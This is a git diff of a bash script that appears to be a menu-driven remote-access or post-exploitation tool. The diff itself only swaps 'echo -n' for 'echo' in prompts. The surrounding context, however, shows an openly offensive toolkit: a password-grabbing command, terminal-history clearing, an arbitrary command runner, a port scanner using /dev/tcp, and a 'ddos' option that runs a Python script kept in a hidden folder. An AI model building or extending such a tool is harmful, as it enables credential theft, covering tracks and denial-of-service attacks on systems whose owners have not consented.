@@ -16,7 +16,7 @@ grab          tries to grab password
 clear         clears terminal history"
 
 while true; do
-echo -n "> "
+echo "> "
 read COMMAND
 
 case $COMMAND in
@@ -38,7 +38,7 @@ screenshot)
     echo "$SCREENSHOT"
     ;;
 talk)
-    echo -n "Enter text to speech dialogue: "
+    echo "Enter text to speech dialogue: "
     read INPUT
     TALK=$(say $INPUT)
     ;;
@@ -60,7 +60,7 @@ clear         clears terminal history"
 
 ;;
 command)
-    echo -n "Custom bash command: "
+    echo "Custom bash command: "
     read COMMAND
     CUSTOM_COMMAND=$($COMMAND)
     echo "$COMMAND"
@@ -70,9 +70,9 @@ ddos)
     python3 .hidden/ddos.py
     ;;
 scan)
-    echo -n "Enter port: "
+    echo "Enter port: "
     read PORT
-    echo -n "Enter address: "
+    echo "Enter address: "
     read ADDR
   echo >/dev/tcp/$ADDR/$PORT &&
     echo "port $PORT is open" ||
